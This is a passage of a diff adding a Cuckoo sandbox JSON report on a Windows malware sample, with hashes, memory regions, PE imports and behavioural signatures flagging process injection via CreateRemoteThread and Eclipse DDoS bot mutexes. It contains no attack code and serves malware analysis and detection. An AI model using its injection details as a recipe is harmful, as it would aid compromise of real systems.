+                }, 
+                {
+                    "protect": "rwx", 
+                    "end": "0x001c1000", 
+                    "addr": "0x001c0000", 
+                    "state": 4096, 
+                    "offset": 205040, 
+                    "type": 131072, 
+                    "size": 4096
+                }, 
+                {
+                    "protect": "rwx", 
+                    "end": "0x001d1000", 
+                    "addr": "0x001d0000", 
+                    "state": 4096, 
+                    "offset": 209160, 
+                    "type": 131072, 
+                    "size": 4096
+                }, 
+                {
+                    "protect": "rw", 
+                    "end": "0x001e1000", 
+                    "addr": "0x001e0000", 
+                    "state": 4096, 
+                    "offset": 213280, 
+                    "type": 131072, 
+                    "size": 4096
+                }, 
+                {
+                    "protect": "rw", 
+                    "end": "0x00207000", 
+                    "addr": "0x001f0000", 
+                    "state": 4096, 
+                    "offset": 217400, 
+                    "type": 131072, 
+                    "size": 94208
+                }, 
+                {
+                    "protect": "rx", 
+                    "end": "0x00271000", 
+                    "addr": "0x00270000", 
+                    "state": 4096, 
+                    "offset": 311632, 
+                    "type": 131072, 
+                    "size": 4096
+                }, 
+                {
+                    "protect": "rw", 
+                    "end": "0x002d6000", 
+                    "addr": "0x00280000", 
+                    "state": 4096, 
+                    "offset": 315752, 
+                    "type": 131072, 
+                    "size": 352256
+                }, 
+                {
+                    "protect": "r", 
+                    "end": "0x003e7000", 
+                    "addr": "0x00380000", 
+                    "state": 4096, 
+                    "offset": 668032, 
+                    "type": 262144, 
+                    "size": 421888
+                }
+            ], 
+            "yara": [], 
+            "num": 2, 
+            "file": "/home/debian/.cuckoo/storage/analyses/1/memory/2044-2.dmp", 
+            "urls": [], 
+            "extracted": [], 
+            "pid": 2044
+        }
+    ], 
+    "target": {
+        "category": "file", 
+        "file": {
+            "yara": [], 
+            "sha1": "e2cce3ba8f77acb99bde74c5f2c62819202e1b4c", 
+            "name": "malware1.exe", 
+            "type": "PE32 executable (console) Intel 80386, for MS Windows", 
+            "sha256": "dd8b313fd69d838d9367d36300d35de4484062dc00b5d40c8c053a2748b5f607", 
+            "urls": [], 
+            "crc32": "C48850E1", 
+            "path": "/home/debian/.cuckoo/storage/binaries/dd8b313fd69d838d9367d36300d35de4484062dc00b5d40c8c053a2748b5f607", 
+            "ssdeep": null, 
+            "size": 92160, 
+            "sha512": "3c988982f905cf258596adcbf08c3805d4442263627a08f4d9a81ad6fd0809ca9fcc1d88bf11e8cd3e18cf20d4474da911628c3d712823b8e3299ba392d5dd9d", 
+            "md5": "74eac3631d2652f1b0fc8a79070364b4"
+        }
+    }, 
+    "buffer": [
+        {
+            "yara": [], 
+            "sha1": "c806923cd74e6e61a5acf8fdc7eb23efce7a0fa0", 
+            "name": "c806923cd74e6e61a5acf8fdc7eb23efce7a0fa0", 
+            "type": "PE32 executable (console) Intel 80386, for MS Windows", 
+            "sha256": "7b3420a03754049f4e08949093dca0cb3091c3199759ec6f2331e73bef294646", 
+            "urls": [], 
+            "crc32": "71252E99", 
+            "path": "/home/debian/.cuckoo/storage/analyses/1/buffer/c806923cd74e6e61a5acf8fdc7eb23efce7a0fa0", 
+            "ssdeep": null, 
+            "size": 110592, 
+            "sha512": "a07712a6352c5a5771998cbc2dcf945bf2ca1d9738a8f191432c5f78d600daff142b656155bdd4a9408664c55fe2dbf7f62c6b438a5b553b32081cd2977c1cf6", 
+            "md5": "f51d3fa30d61fc0c8c9bfcefb68f5ec6"
+        }
+    ], 
+    "signatures": [
+        {
+            "families": [], 
+            "description": "One or more potentially interesting buffers were extracted, these generally contain injected code, configuration data, etc.", 
+            "severity": 2, 
+            "ttp": {}, 
+            "markcount": 0, 
+            "references": [], 
+            "marks": [], 
+            "name": "dumped_buffer"
+        }, 
+        {
+            "families": [], 
+            "description": "Potentially malicious URLs were found in the process memory dump", 
+            "severity": 2, 
+            "ttp": {}, 
+            "markcount": 371, 
+            "references": [], 
+            "marks": [
+                {
+                    "category": "url", 
+                    "ioc": "http://www.expedia.com/favicon.ico", 
+                    "type": "ioc", 
+                    "description": null
+                }, 
+                {
+                    "category": "url", 
+                    "ioc": "http://uk.ask.com/favicon.ico", 
+                    "type": "ioc", 
+                    "description": null
+                }, 
+                {
+                    "category": "url", 
+                    "ioc": "http://www.priceminister.com/", 
+                    "type": "ioc", 
+                    "description": null
+                }, 
+                {
+                    "category": "url", 
+                    "ioc": "http://www.iask.com/favicon.ico", 
+                    "type": "ioc", 
+                    "description": null
+                }, 
+                {
+                    "category": "url", 
+                    "ioc": "http://www.merlin.com.pl/favicon.ico", 
+                    "type": "ioc", 
+                    "description": null
+                }, 
+                {
+                    "category": "url", 
+                    "ioc": "http://www.cnet.com/favicon.ico", 
+                    "type": "ioc", 
+                    "description": null
+                }, 
+                {
+                    "category": "url", 
+                    "ioc": "http://search.nifty.com/", 
+                    "type": "ioc", 
+                    "description": null
+                }, 
+                {
+                    "category": "url", 
+                    "ioc": "http://ns.adobe.com/exif/1.0/", 
+                    "type": "ioc", 
+                    "description": null
+                }, 
+                {
+                    "category": "url", 
+                    "ioc": "http://www.etmall.com.tw/", 
+                    "type": "ioc", 
+                    "description": null
+                }, 
+                {
+                    "category": "url", 
+                    "ioc": "http://search.goo.ne.jp/", 
+                    "type": "ioc", 
+                    "description": null
+                }, 
+                {
+                    "category": "url", 
+                    "ioc": "http://fr.wikipedia.org/favicon.ico", 
+                    "type": "ioc", 
+                    "description": null
+                }, 
+                {
+                    "category": "url", 
+                    "ioc": "http://busca.estadao.com.br/favicon.ico", 
+                    "type": "ioc", 
+                    "description": null
+                }, 
+                {
+                    "category": "url", 
+                    "ioc": "http://search.hanafos.com/favicon.ico", 
+                    "type": "ioc", 
+                    "description": null
+                }, 
+                {
+                    "category": "url", 
+                    "ioc": "http://search.chol.com/favicon.ico", 
+                    "type": "ioc", 
+                    "description": null
+                }, 
+                {
+                    "category": "url", 
+                    "ioc": "http://amazon.fr/", 
+                    "type": "ioc", 
+                    "description": null
+                }, 
+                {
+                    "category": "url", 
+                    "ioc": "http://www.amazon.co.jp/", 
+                    "type": "ioc", 
+                    "description": null
+                }, 
+                {
+                    "category": "url", 
+                    "ioc": "http://www.mtv.com/favicon.ico", 
+                    "type": "ioc", 
+                    "description": null
+                }, 
+                {
+                    "category": "url", 
+                    "ioc": "http://busqueda.aol.com.mx/", 
+                    "type": "ioc", 
+                    "description": null
+                }, 
+                {
+                    "category": "url", 
+                    "ioc": "http://search.live.com/results.aspx?FORM=SOLTDF", 
+                    "type": "ioc", 
+                    "description": null
+                }, 
+                {
+                    "category": "url", 
+                    "ioc": "http://msdn.microsoft.com/", 
+                    "type": "ioc", 
+                    "description": null
+                }, 
+                {
+                    "category": "url", 
+                    "ioc": "http://msdn.microsoft.com/workshop/security/privacy/overview/privacyimportxml.asp)", 
+                    "type": "ioc", 
+                    "description": null
+                }, 
+                {
+                    "category": "url", 
+                    "ioc": "http://www.sify.com/favicon.ico", 
+                    "type": "ioc", 
+                    "description": null
+                }, 
+                {
+                    "category": "url", 
+                    "ioc": "http://yellowpages.superpages.com/", 
+                    "type": "ioc", 
+                    "description": null
+                }, 
+                {
+                    "category": "url", 
+                    "ioc": "http://suche.freenet.de/", 
+                    "type": "ioc", 
+                    "description": null
+                }, 
+                {
+                    "category": "url", 
+                    "ioc": "http://search.aol.com/", 
+                    "type": "ioc", 
+                    "description": null
+                }, 
+                {
+                    "category": "url", 
+                    "ioc": "http://browse.guardian.co.uk/", 
+                    "type": "ioc", 
+                    "description": null
+                }, 
+                {
+                    "category": "url", 
+                    "ioc": "http://www.mercadolibre.com.mx/", 
+                    "type": "ioc", 
+                    "description": null
+                }, 
+                {
+                    "category": "url", 
+                    "ioc": "http://www.asharqalawsat.com/", 
+                    "type": "ioc", 
+                    "description": null
+                }, 
+                {
+                    "category": "url", 
+                    "ioc": "http://www.facebook.com/", 
+                    "type": "ioc", 
+                    "description": null
+                }, 
+                {
+                    "category": "url", 
+                    "ioc": "http://si.wikipedia.org/favicon.ico", 
+                    "type": "ioc", 
+                    "description": null
+                }, 
+                {
+                    "category": "url", 
+                    "ioc": "http://www.rtl.de/favicon.ico", 
+                    "type": "ioc", 
+                    "description": null
+                }, 
+                {
+                    "category": "url", 
+                    "ioc": "http://search.msn.com/results.aspx?q=", 
+                    "type": "ioc", 
+                    "description": null
+                }, 
+                {
+                    "category": "url", 
+                    "ioc": "http://www.microsoft.com.", 
+                    "type": "ioc", 
+                    "description": null
+                }, 
+                {
+                    "category": "url", 
+                    "ioc": "http://search.naver.com/favicon.ico", 
+                    "type": "ioc", 
+                    "description": null
+                }, 
+                {
+                    "category": "url", 
+                    "ioc": "http://en.wikipedia.org/favicon.ico", 
+                    "type": "ioc", 
+                    "description": null
+                }, 
+                {
+                    "category": "url", 
+                    "ioc": "http://si.wikipedia.org/w/api.php?action=opensearch", 
+                    "type": "ioc", 
+                    "description": null
+                }, 
+                {
+                    "category": "url", 
+                    "ioc": "http://udn.com/favicon.ico", 
+                    "type": "ioc", 
+                    "description": null
+                }, 
+                {
+                    "category": "url", 
+                    "ioc": "http://rover.ebay.com", 
+                    "type": "ioc", 
+                    "description": null
+                }, 
+                {
+                    "category": "url", 
+                    "ioc": "http://search.ebay.fr/", 
+                    "type": "ioc", 
+                    "description": null
+                }, 
+                {
+                    "category": "url", 
+                    "ioc": "http://www.univision.com/", 
+                    "type": "ioc", 
+                    "description": null
+                }, 
+                {
+                    "category": "url", 
+                    "ioc": "http://pt.wikipedia.org/w/api.php?action=opensearch", 
+                    "type": "ioc", 
+                    "description": null
+                }, 
+                {
+                    "category": "url", 
+                    "ioc": "http://it.wikipedia.org/favicon.ico", 
+                    "type": "ioc", 
+                    "description": null
+                }, 
+                {
+                    "category": "url", 
+                    "ioc": "http://uk.ask.com/", 
+                    "type": "ioc", 
+                    "description": null
+                }, 
+                {
+                    "category": "url", 
+                    "ioc": "http://www.google.co.uk/", 
+                    "type": "ioc", 
+                    "description": null
+                }, 
+                {
+                    "category": "url", 
+                    "ioc": "http://cnweb.search.live.com/results.aspx?q=", 
+                    "type": "ioc", 
+                    "description": null
+                }, 
+                {
+                    "category": "url", 
+                    "ioc": "http://www.google.cz/", 
+                    "type": "ioc", 
+                    "description": null
+                }, 
+                {
+                    "category": "url", 
+                    "ioc": "http://www.google.co.jp/", 
+                    "type": "ioc", 
+                    "description": null
+                }, 
+                {
+                    "category": "url", 
+                    "ioc": "http://search.ebay.co.uk/", 
+                    "type": "ioc", 
+                    "description": null
+                }, 
+                {
+                    "category": "url", 
+                    "ioc": "http://www.weather.com/", 
+                    "type": "ioc", 
+                    "description": null
+                }, 
+                {
+                    "category": "url", 
+                    "ioc": "http://www.taobao.com/favicon.ico", 
+                    "type": "ioc", 
+                    "description": null
+                }
+            ], 
+            "name": "memdump_urls"
+        }, 
+        {
+            "families": [], 
+            "description": "Uses Windows utilities for basic Windows functionality", 
+            "severity": 2, 
+            "ttp": {
+                "T1053": {
+                    "short": "Scheduled Task", 
+                    "long": "Utilities such as at and schtasks, along with the Windows Task Scheduler, can be used to schedule programs or scripts to be executed at a date and time. A task can also be scheduled on a remote system, provided the proper authentication is met to use RPC and file and printer sharing is turned on. Scheduling a task on a remote system typically required being a member of the Administrators group on the the remote system."
+                }
+            }, 
+            "markcount": 1, 
+            "references": [
+                "http://blog.jpcert.or.jp/2016/01/windows-commands-abused-by-attackers.html"
+            ], 
+            "marks": [
+                {
+                    "category": "cmdline", 
+                    "ioc": "C:\\Program Files (x86)\\Internet Explorer\\iexplore.exe", 
+                    "type": "ioc", 
+                    "description": null
+                }
+            ], 
+            "name": "uses_windows_utilities"
+        }, 
+        {
+            "families": [], 
+            "description": "One or more of the buffers contains an embedded PE file", 
+            "severity": 3, 
+            "ttp": {}, 
+            "markcount": 1, 
+            "references": [], 
+            "marks": [
+                {
+                    "category": "buffer", 
+                    "ioc": "Buffer with sha1: c806923cd74e6e61a5acf8fdc7eb23efce7a0fa0", 
+                    "type": "ioc", 
+                    "description": null
+                }
+            ], 
+            "name": "dumped_buffer2"
+        }, 
+        {
+            "families": [], 
+            "description": "Allocates execute permission to another process indicative of possible code injection", 
+            "severity": 3, 
+            "ttp": {}, 
+            "markcount": 1, 
+            "references": [], 
+            "marks": [
+                {
+                    "call": {
+                        "category": "process", 
+                        "status": 1, 
+                        "stacktrace": [], 
+                        "api": "NtAllocateVirtualMemory", 
+                        "return_value": 0, 
+                        "arguments": {
+                            "process_identifier": 2800, 
+                            "region_size": 110592, 
+                            "stack_dep_bypass": 0, 
+                            "stack_pivoted": 0, 
+                            "heap_dep_bypass": 0, 
+                            "protection": 64, 
+                            "process_handle": "0x00000108", 
+                            "allocation_type": 12288, 
+                            "base_address": "0x000a0000"
+                        }, 
+                        "time": 1601052899.57775, 
+                        "tid": 2248, 
+                        "flags": {
+                            "protection": "PAGE_EXECUTE_READWRITE", 
+                            "allocation_type": "MEM_COMMIT|MEM_RESERVE"
+                        }
+                    }, 
+                    "pid": 2044, 
+                    "type": "call", 
+                    "cid": 12
+                }
+            ], 
+            "name": "allocates_execute_remote_process"
+        }, 
+        {
+            "families": [
+                "eclipse"
+            ], 
+            "description": "Creates known Eclipse DDoS Bot mutexes", 
+            "severity": 3, 
+            "ttp": {}, 
+            "markcount": 0, 
+            "references": [], 
+            "marks": [], 
+            "name": "ddos_eclipse_mutexes"
+        }, 
+        {
+            "families": [], 
+            "description": "Creates a thread using CreateRemoteThread in a non-child process indicative of process injection", 
+            "severity": 3, 
+            "ttp": {
+                "T1055": {
+                    "short": "Process Injection", 
+                    "long": "Process injection is a method of executing arbitrary code in the address space of a separate live process. Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via process injection may also evade detection from security products since the execution is masked under a legitimate process."
+                }
+            }, 
+            "markcount": 2, 
+            "references": [
+                "www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process"
+            ], 
+            "marks": [
+                {
+                    "category": "Process injection", 
+                    "ioc": "Process 2044 created a remote thread in non-child process 2800", 
+                    "type": "ioc", 
+                    "description": null
+                }, 
+                {
+                    "call": {
+                        "category": "process", 
+                        "status": 1, 
+                        "stacktrace": [], 
+                        "api": "CreateRemoteThread", 
+                        "return_value": 272, 
+                        "arguments": {
+                            "thread_identifier": 0, 
+                            "process_identifier": 2800, 
+                            "function_address": "0x000a6d30", 
+                            "flags": 0, 
+                            "process_handle": "0x00000108", 
+                            "parameter": "0x00000000", 
+                            "stack_size": 0
+                        }, 
+                        "time": 1601052899.59375, 
+                        "tid": 2248, 
+                        "flags": {}
+                    }, 
+                    "pid": 2044, 
+                    "type": "call", 
+                    "cid": 15
+                }
+            ], 
+            "name": "injection_createremotethread"
+        }, 
+        {
+            "families": [], 
+            "description": "Manipulates memory of a non-child process indicative of process injection", 
+            "severity": 3, 
+            "ttp": {}, 
+            "markcount": 2, 
+            "references": [
+                "www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process"
+            ], 
+            "marks": [
+                {
+                    "category": "Process injection", 
+                    "ioc": "Process 2044 manipulating memory of non-child process 2800", 
+                    "type": "ioc", 
+                    "description": null
+                }, 
+                {
+                    "call": {
+                        "category": "process", 
+                        "status": 1, 
+                        "stacktrace": [], 
+                        "api": "NtAllocateVirtualMemory", 
+                        "return_value": 0, 
+                        "arguments": {
+                            "process_identifier": 2800, 
+                            "region_size": 110592, 
+                            "stack_dep_bypass": 0, 
+                            "stack_pivoted": 0, 
+                            "heap_dep_bypass": 0, 
+                            "protection": 64, 
+                            "process_handle": "0x00000108", 
+                            "allocation_type": 12288, 
+                            "base_address": "0x000a0000"
+                        }, 
+                        "time": 1601052899.57775, 
+                        "tid": 2248, 
+                        "flags": {
+                            "protection": "PAGE_EXECUTE_READWRITE", 
+                            "allocation_type": "MEM_COMMIT|MEM_RESERVE"
+                        }
+                    }, 
+                    "pid": 2044, 
+                    "type": "call", 
+                    "cid": 12
+                }
+            ], 
+            "name": "injection_modifies_memory"
+        }
+    ], 
+    "static": {
+        "pdb_path": null, 
+        "pe_imports": [
+            {
+                "imports": [
+                    {
+                        "name": "GetModuleHandleA", 
+                        "address": "0x418034"
+                    }, 
+                    {
+                        "name": "GetComputerNameA", 
+                        "address": "0x418038"
+                    }, 
+                    {
+                        "name": "GetVersionExA", 
+                        "address": "0x41803c"
+                    }, 
+                    {
+                        "name": "CreateToolhelp32Snapshot", 
+                        "address": "0x418040"
+                    }, 
+                    {
+                        "name": "Process32First", 
+                        "address": "0x418044"
+                    }, 
+                    {
+                        "name": "Process32Next", 
+                        "address": "0x418048"
+                    }, 
+                    {
+                        "name": "VirtualAlloc", 
+                        "address": "0x41804c"
+                    }, 
+                    {
+                        "name": "SetEvent", 
+                        "address": "0x418050"
+                    }, 
+                    {
+                        "name": "WaitForSingleObject", 
+                        "address": "0x418054"
+                    }, 
+                    {
+                        "name": "Sleep", 
+                        "address": "0x418058"
+                    }, 
+                    {
+                        "name": "GetLastError", 
+                        "address": "0x41805c"
+                    }, 
+                    {
+                        "name": "SetLastError", 
+                        "address": "0x418060"
+                    }, 
+                    {
+                        "name": "lstrlenW", 
+                        "address": "0x418064"
+                    }, 
+                    {
+                        "name": "CreateEventA", 
+                        "address": "0x418068"
+                    }, 
+                    {
+                        "name": "CreateDirectoryW", 
+                        "address": "0x41806c"
+                    }, 
+                    {
+                        "name": "DeleteFileW", 
+                        "address": "0x418070"
+                    }, 
+                    {
+                        "name": "CopyFileW", 
+                        "address": "0x418074"
+                    }, 
+                    {
+                        "name": "MultiByteToWideChar", 
+                        "address": "0x418078"
+                    }, 
+                    {
+                        "name": "VirtualAllocEx", 
+                        "address": "0x41807c"
+                    }, 
+                    {
+                        "name": "VirtualFreeEx", 
+                        "address": "0x418080"
+                    }, 
+                    {
+                        "name": "ExitProcess", 
+                        "address": "0x418084"
+                    }, 
+                    {
+                        "name": "CreateRemoteThread", 
+                        "address": "0x418088"
+                    }, 
+                    {
+                        "name": "WriteProcessMemory", 
+                        "address": "0x41808c"
+                    }, 
+                    {
+                        "name": "DuplicateHandle", 
+                        "address": "0x418090"
+                    }, 
+                    {
+                        "name": "CreateProcessW", 
+                        "address": "0x418094"
+                    }, 
+                    {
+                        "name": "GetProcessVersion", 
+                        "address": "0x418098"
+                    }, 
+                    {
+                        "name": "IsBadReadPtr", 
+                        "address": "0x41809c"
+                    }, 
+                    {
+                        "name": "VirtualFree", 
+                        "address": "0x4180a0"
+                    }, 
+                    {
+                        "name": "VirtualQuery", 
+                        "address": "0x4180a4"
+                    }, 
+                    {
+                        "name": "VirtualQueryEx", 
+                        "address": "0x4180a8"
+                    }, 
+                    {
+                        "name": "GetProcessHeap", 
+                        "address": "0x4180ac"
+                    }, 
+                    {
+                        "name": "OpenProcess", 
+                        "address": "0x4180b0"
+                    }, 
+                    {
+                        "name": "GetCurrentProcessId", 
+                        "address": "0x4180b4"
+                    }, 
+                    {
+                        "name": "TerminateProcess", 
+                        "address": "0x4180b8"
+                    }, 
+                    {
+                        "name": "lstrlenA", 
+                        "address": "0x4180bc"
+                    }, 
+                    {
+                        "name": "GetCurrentThread", 
+                        "address": "0x4180c0"
+                    }, 
+                    {
+                        "name": "SetThreadPriority", 
+                        "address": "0x4180c4"
+                    }, 
+                    {
+                        "name": "ReadProcessMemory", 
+                        "address": "0x4180c8"
+                    }, 
+                    {
+                        "name": "InitializeCriticalSection", 
+                        "address": "0x4180cc"
+                    }, 
+                    {
+                        "name": "GetLocalTime", 
+                        "address": "0x4180d0"
+                    }, 
+                    {
+                        "name": "MapViewOfFile", 
+                        "address": "0x4180d4"
+                    }, 
+                    {
+                        "name": "lstrcmpA", 
+                        "address": "0x4180d8"
+                    }, 
+                    {
+                        "name": "lstrcmpiA", 
+                        "address": "0x4180dc"
+                    }, 
+                    {
+                        "name": "lstrcpyW", 
+                        "address": "0x4180e0"
+                    }, 
+                    {
+                        "name": "lstrcatW", 
+                        "address": "0x4180e4"
+                    }, 
+                    {
+                        "name": "CreateMutexA", 
+                        "address": "0x4180e8"
+                    }, 
+                    {
+                        "name": "CreateFileMappingA", 
+                        "address": "0x4180ec"
+                    }, 
+                    {
+                        "name": "GetModuleFileNameA", 
+                        "address": "0x4180f0"
+                    }, 
+                    {
+                        "name": "GetModuleFileNameW", 
+                        "address": "0x4180f4"
+                    }, 
+                    {
+                        "name": "GetCommandLineA", 
+                        "address": "0x4180f8"
+                    }, 
+                    {
+                        "name": "WideCharToMultiByte", 
+                        "address": "0x4180fc"
+                    }, 
+                    {
+                        "name": "TerminateThread", 
+                        "address": "0x418100"
+                    }, 
+                    {
+                        "name": "SuspendThread", 
+                        "address": "0x418104"
+                    }, 
+                    {
+                        "name": "ResumeThread", 
+                        "address": "0x418108"
+                    }, 
+                    {
+                        "name": "WriteFile", 
+                        "address": "0x41810c"
+                    }, 
+                    {
+                        "name": "CreateFileW", 
+                        "address": "0x418110"
+                    }, 
+                    {
+                        "name": "SetFilePointerEx", 
+                        "address": "0x418114"
+                    }, 
+                    {
+                        "name": "SetStdHandle", 
+                        "address": "0x418118"
+                    }, 
+                    {
+                        "name": "GetConsoleMode", 
+                        "address": "0x41811c"
+                    }, 
+                    {
+                        "name": "GetConsoleCP", 
+                        "address": "0x418120"
+                    }, 
+                    {
+                        "name": "FlushFileBuffers", 
+                        "address": "0x418124"
+                    }, 
+                    {
+                        "name": "GetStringTypeW", 
+                        "address": "0x418128"
+                    }, 
+                    {
+                        "name": "RtlUnwind", 
+                        "address": "0x41812c"
+                    }, 
+                    {
+                        "name": "lstrcatA", 
+                        "address": "0x418130"
+                    }, 
+                    {
+                        "name": "GetSystemInfo", 
+                        "address": "0x418134"
+                    }, 
+                    {
+                        "name": "LeaveCriticalSection", 
+                        "address": "0x418138"
+                    }, 
+                    {
+                        "name": "EnterCriticalSection", 
+                        "address": "0x41813c"
+                    }, 
+                    {
+                        "name": "GetProcAddress", 
+                        "address": "0x418140"
+                    }, 
+                    {
+                        "name": "HeapFree", 
+                        "address": "0x418144"
+                    }, 
+                    {
+                        "name": "HeapAlloc", 
+                        "address": "0x418148"
+                    }, 
+                    {
+                        "name": "LoadLibraryA", 
+                        "address": "0x41814c"
+                    }, 
+                    {
+                        "name": "lstrcpyA", 
+                        "address": "0x418150"
+                    }, 
+                    {
+                        "name": "GetTickCount", 
+                        "address": "0x418154"
+                    }, 
+                    {
+                        "name": "CloseHandle", 
+                        "address": "0x418158"
+                    }, 
+                    {
+                        "name": "GetCurrentProcess", 
+                        "address": "0x41815c"
+                    }, 
+                    {
+                        "name": "CreateThread", 
+                        "address": "0x418160"
+                    }, 
+                    {
+                        "name": "LCMapStringW", 
+                        "address": "0x418164"
+                    }, 
+                    {
+                        "name": "GetCurrentThreadId", 
+                        "address": "0x418168"
+                    }, 
+                    {
+                        "name": "OutputDebugStringW", 
+                        "address": "0x41816c"
+                    }, 
+                    {
+                        "name": "GetCPInfo", 
+                        "address": "0x418170"
+                    }, 
+                    {
+                        "name": "GetOEMCP", 
+                        "address": "0x418174"
+                    }, 
+                    {
+                        "name": "GetACP", 
+                        "address": "0x418178"
+                    }, 
+                    {
+                        "name": "IsValidCodePage", 
+                        "address": "0x41817c"
+                    }, 
+                    {
+                        "name": "LoadLibraryExW", 
+                        "address": "0x418180"
+                    }, 
+                    {
+                        "name": "GetStdHandle", 
+                        "address": "0x418184"
+                    }, 
+                    {
+                        "name": "TlsSetValue", 
+                        "address": "0x418188"
+                    }, 
+                    {
+                        "name": "TlsGetValue", 
+                        "address": "0x41818c"
+                    }, 
+                    {
+                        "name": "InitializeCriticalSectionAndSpinCount", 
+                        "address": "0x418190"
+                    }, 
+                    {
+                        "name": "SetUnhandledExceptionFilter", 
+                        "address": "0x418194"
+                    }, 
+                    {
+                        "name": "UnhandledExceptionFilter", 
+                        "address": "0x418198"
+                    }, 
+                    {
+                        "name": "EncodePointer", 
+                        "address": "0x41819c"
+                    }, 
+                    {
+                        "name": "DecodePointer", 
+                        "address": "0x4181a0"
+                    }, 
+                    {
+                        "name": "GetModuleHandleExW", 
+                        "address": "0x4181a4"
+                    }, 
+                    {
+                        "name": "IsDebuggerPresent", 
+                        "address": "0x4181a8"
+                    }, 
+                    {
+                        "name": "IsProcessorFeaturePresent", 
+                        "address": "0x4181ac"
+                    }, 
+                    {
+                        "name": "DeleteCriticalSection", 
+                        "address": "0x4181b0"
+                    }, 
+                    {
+                        "name": "WriteConsoleW", 
+                        "address": "0x4181b4"
+                    }
+                ], 
+                "dll": "KERNEL32.dll"
+            }, 
+            {
+                "imports": [
+                    {
+                        "name": "CreateWindowExA", 
+                        "address": "0x4181d8"
+                    }, 
+                    {
+                        "name": "wsprintfA", 
+                        "address": "0x4181dc"
+                    }, 
+                    {
+                        "name": "GetSystemMetrics", 
+                        "address": "0x4181e0"
+                    }, 
+                    {
+                        "name": "wsprintfW", 
+                        "address": "0x4181e4"
+                    }, 
+                    {
+                        "name": "DefWindowProcA", 
+                        "address": "0x4181e8"
+                    }, 
+                    {
+                        "name": "TranslateMessage", 
+                        "address": "0x4181ec"
+                    }, 
+                    {
+                        "name": "RegisterClassExA", 
+                        "address": "0x4181f0"
+                    }, 
+                    {
+                        "name": "DispatchMessageA", 
+                        "address": "0x4181f4"
+                    }, 
+                    {
+                        "name": "GetMessageA", 
+                        "address": "0x4181f8"
+                    }, 
+                    {
+                        "name": "MessageBoxA", 
+                        "address": "0x4181fc"
+                    }
+                ], 
+                "dll": "USER32.dll"
+            }, 
+            {
+                "imports": [
+                    {
+                        "name": "RegCloseKey", 
+                        "address": "0x418000"
+                    }, 
+                    {
+                        "name": "RegDeleteKeyA", 
+                        "address": "0x418004"
+                    }, 
+                    {
+                        "name": "RegSetValueExW", 
+                        "address": "0x418008"
+                    }, 
+                    {
+                        "name": "RegSetValueExA", 
+                        "address": "0x41800c"
+                    }, 
+                    {
+                        "name": "RegQueryValueExA", 
+                        "address": "0x418010"
+                    }, 
+                    {
+                        "name": "RegOpenKeyExA", 
+                        "address": "0x418014"
+                    }, 
+                    {
+                        "name": "RegNotifyChangeKeyValue", 
+                        "address": "0x418018"
+                    }, 
+                    {
+                        "name": "RegCreateKeyExA", 
+                        "address": "0x41801c"
+                    }, 
+                    {
+                        "name": "GetUserNameA", 
+                        "address": "0x418020"
+                    }, 
+                    {
+                        "name": "LookupPrivilegeValueA", 
+                        "address": "0x418024"
+                    }, 
+                    {
+                        "name": "AdjustTokenPrivileges", 
+                        "address": "0x418028"
+                    }, 
+                    {
+                        "name": "OpenProcessToken", 
+                        "address": "0x41802c"
+                    }
+                ], 
+                "dll": "ADVAPI32.dll"
+            }, 
+            {
+                "imports": [
+                    {
+                        "name": "SHGetFolderPathW", 
+                        "address": "0x4181c4"
+                    }
+                ], 
+                "dll": "SHELL32.dll"
+            }, 
+            {
+                "imports": [
+                    {
+                        "name": "CoCreateGuid", 
+                        "address": "0x41824c"
+                    }
+                ], 
+                "dll": "ole32.dll"
+            }, 
+            {
+                "imports": [
+                    {
+                        "name": "StrStrA", 
+                        "address": "0x4181cc"
+                    }, 
+                    {
+                        "name": "StrCmpNIA", 
+                        "address": "0x4181d0"
+                    }
+                ], 
+                "dll": "SHLWAPI.dll"
+            }, 
+            {
+                "imports": [
+                    {
+                        "name": "InternetOpenUrlA", 
+                        "address": "0x418204"
+                    }, 
+                    {
+                        "name": "InternetOpenA", 
+                        "address": "0x418208"
+                    }, 
+                    {
+                        "name": "InternetCloseHandle", 
+                        "address": "0x41820c"
+                    }, 
+                    {
+                        "name": "HttpOpenRequestA", 
+                        "address": "0x418210"
+                    }, 
+                    {
+                        "name": "InternetGetCookieA", 
+                        "address": "0x418214"
+                    }, 
+                    {
+                        "name": "InternetReadFile", 
+                        "address": "0x418218"
+                    }, 
+                    {
+                        "name": "InternetConnectA", 
+                        "address": "0x41821c"
+                    }, 
+                    {
+                        "name": "HttpSendRequestA", 
+                        "address": "0x418220"
+                    }
+                ], 
+                "dll": "WININET.dll"
+            }, 
+            {
+                "imports": [
+                    {
+                        "name": "ObtainUserAgentString", 
+                        "address": "0x418254"
+                    }
+                ], 
+                "dll": "urlmon.dll"
+            }, 
+            {
+                "imports": [
+                    {
+                        "name": "connect", 
+                        "address": "0x418228"
+                    }, 
+                    {
+                        "name": "WSAStartup", 
+                        "address": "0x41822c"
+                    }, 
+                    {
+                        "name": "socket", 
+                        "address": "0x418230"
+                    }, 
+                    {
+                        "name": "send", 
+                        "address": "0x418234"
+                    }, 
+                    {
+                        "name": "closesocket", 
+                        "address": "0x418238"
+                    }, 
+                    {
+                        "name": "WSACleanup", 
+                        "address": "0x41823c"
+                    }, 
+                    {
+                        "name": "htons", 
+                        "address": "0x418240"
+                    }, 
+                    {
+                        "name": "inet_addr", 
+                        "address": "0x418244"
+                    }
+                ], 
+                "dll": "WS2_32.dll"
+            }, 
+            {
+                "imports": [
+                    {
+                        "name": "UuidToStringA", 
+                        "address": "0x4181bc"
+                    }
+                ], 
+                "dll": "RPCRT4.dll"
+            }
+        ], 
+        "peid_signatures": null, 
+        "keys": [], 
+        "signature": [], 
+        "pe_timestamp": "2020-09-08 20:32:50", 
+        "pe_exports": [], 
+        "imported_dll_count": 10, 
+        "pe_imphash": "5062c3315fb2464e40f26aabc8cbbf8e", 
+        "pe_resources": [], 
+        "pe_versioninfo": [], 
+        "pe_sections": [
+            {
+                "size_of_data": "0x00011000", 
+                "virtual_address": "0x00001000", 
+                "entropy": 6.308396605861811, 
+                "name": ".text", 
+                "virtual_size": "0x00010e1c"
+            }, 
+            {
+                "size_of_data": "0x00003200", 
+                "virtual_address": "0x00012000", 
+                "entropy": 4.47799347660554, 
+                "name": ".data", 
+                "virtual_size": "0x00005b50"
+            }, 
+            {
+                "size_of_data": "0x00001000", 
+                "virtual_address": "0x00018000", 
